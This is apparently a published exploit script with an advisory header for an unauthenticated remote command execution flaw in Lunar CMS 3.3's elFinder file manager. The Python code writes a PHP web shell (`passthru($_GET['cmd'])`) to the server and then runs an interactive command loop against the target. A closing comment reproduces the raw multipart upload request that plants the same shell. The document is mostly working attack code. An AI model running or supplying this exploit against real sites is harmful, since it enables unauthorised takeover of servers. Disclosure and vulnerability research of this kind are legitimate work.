#
#
# Lunar CMS 3.3 Unauthenticated Remote Command Execution Exploit
#
#
# Vendor: Lunar CMS
# Product web page: http://www.lunarcms.com
# Affected version: 3.3
#
# Summary: Lunar CMS is a freely distributable open source content
# management system written for use on servers running the ever so
# popular PHP5 & MySQL.
#
# Desc: Lunar CMS suffers from an unauthenticated arbitrary command
# execution vulnerability. The issue is caused due to the improper
# verification of elfinder&#039;s upload/create/rename function in the file
# manager. This can be exploited to execute arbitrary PHP code by creating
# or uploading a malicious PHP script file that will be stored in &#039;/files&#039;
# directory.
#
# Tested on: Apache/2.4.7 (Win32)
#            PHP/5.5.6
#            MySQL 5.6.14
#
#
# Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2014-5189
# Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2014-5189.php
#
# Vendor fix: http://lunarcms.com/Get.html
#
#
# 11.06.2014
#
 
 
import cookielib, urllib
import urllib2, sys, os
 
piton = os.path.basename(sys.argv[0])
 
if len(sys.argv) < 4:
    print &#039;\n\x20\x20[*] Usage: &#039;+piton+&#039; <hostname> <path> <filename.php>\n&#039;
    print &#039;\x20\x20[*] Example: &#039;+piton+&#039; zeroscience.mk lunarcms backdoor.php\n&#039;
    sys.exit()
 
host = sys.argv[1]
path = sys.argv[2]
fname = sys.argv[3]
 
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
 
create = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin/includes/elfinder/php/connector.php?cmd=mkfile&name=&#039;+fname+&#039;&target=l1_XA&#039;)
#print create.read()
 
payload = urllib.urlencode({
                            &#039;cmd&#039; : &#039;put&#039;,
                            &#039;target&#039; : &#039;l1_&#039;+fname.encode(&#039;base64&#039;,&#039;strict&#039;),
                            &#039;content&#039; : &#039;<?php passthru($_GET[\&#039;cmd\&#039;]); ?>&#039;
                            })
 
write = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/admin/includes/elfinder/php/connector.php&#039;, payload)
#print write.read()
print &#039;\n&#039;
while True:
    try:
        cmd = raw_input(&#039;shell@&#039;+host+&#039;:~# &#039;)
 
        execute = opener.open(&#039;http://&#039;+host+&#039;/&#039;+path+&#039;/files/&#039;+fname+&#039;?cmd=&#039;+urllib.quote(cmd))
        reverse = execute.read()
        print reverse;
         
        if cmd.strip() == &#039;exit&#039;:
            break
 
    except Exception:
        break
 
sys.exit()
 
 
#
# Using the upload vector:
#
# POST /lc/admin/includes/elfinder/php/connector.php HTTP/1.1
# Host: localhost
# User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Referer: http://localhost/lc/admin/file_manager.php
# Content-Length: 443
# Content-Type: multipart/form-data; boundary=---------------------------156802976525302
# Cookie: PHPSESSID=n37tnhsdfs1sgolum477jgqg33
# Connection: keep-alive
# Pragma: no-cache
# Cache-Control: no-cache
#
# -----------------------------156802976525302
# Content-Disposition: form-data; name="cmd"
#
# upload
# -----------------------------156802976525302
# Content-Disposition: form-data; name="target"
#
# l1_XA
# -----------------------------156802976525302
# Content-Disposition: form-data; name="upload[]"; filename="shell.php"
# Content-Type: application/octet-stream
#
# <?php passthru($_GET[&#039;cmd&#039;]); ?>
# -----------------------------156802976525302--
#
#

